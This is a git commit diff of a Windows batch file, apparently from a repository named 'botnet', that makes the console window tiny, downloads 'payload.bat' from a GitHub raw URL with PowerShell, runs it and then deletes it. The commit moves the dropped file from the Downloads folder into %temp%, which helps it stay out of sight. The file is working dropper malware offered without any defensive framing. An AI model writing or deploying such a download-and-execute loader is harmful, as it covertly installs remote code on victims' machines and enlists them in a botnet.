bad74208de1183dcfecfa1a1fcd1be5568de550b
H1i_sillyxploiter <129692077+unfunnylaugh@users.noreply.github.com>
2024-02-26 16:44:11 -0300

    Update code.bat

--- code.bat
+++ code.bat
@@ -1,7 +1,7 @@
 @echo off
 mode con: cols=20 lines=1
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/unfunnylaugh/botnet/main/payload.bat', 'C:\Users\%username%\Downloads\payload.bat')"
-start C:\Users\%username%\Downloads\payload.bat
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/unfunnylaugh/botnet/main/payload.bat', '%temp%/payload.bat')"
+start %temp%\payload.bat
 
 timeout /t 1 /nobreak >nul
-del C:\Users\%username%\Downloads\payload.bat
+del %temp%\payload.bat
